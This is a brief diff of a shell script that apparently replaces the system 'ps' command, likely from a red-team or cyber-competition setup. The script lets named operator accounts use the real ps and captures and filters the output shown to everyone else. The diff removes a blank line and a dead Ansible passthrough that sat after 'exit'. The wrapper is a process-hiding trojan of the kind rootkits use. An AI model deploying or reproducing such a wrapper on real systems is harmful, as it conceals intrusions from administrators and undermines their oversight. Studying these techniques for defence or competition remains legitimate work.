@@ -6,7 +6,6 @@ case "$(whoami)" in
     kingneptune|paintythepirate|greyteamadmin) exec $REAL_PS "$@" ;;
 esac
 
-
 # Capture ps output, preserve exit code, then filter
 TMP_OUT=$("$REAL_PS" "$@" 2>&1)
 PS_RC=$?
@@ -20,8 +19,3 @@ while IFS= read -r line; do
 done <<< "$TMP_OUT"
 
 exit $PS_RC
-
-# Pass straight through if running under Ansible
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
-    exec $REAL_PS "$@"
-fi
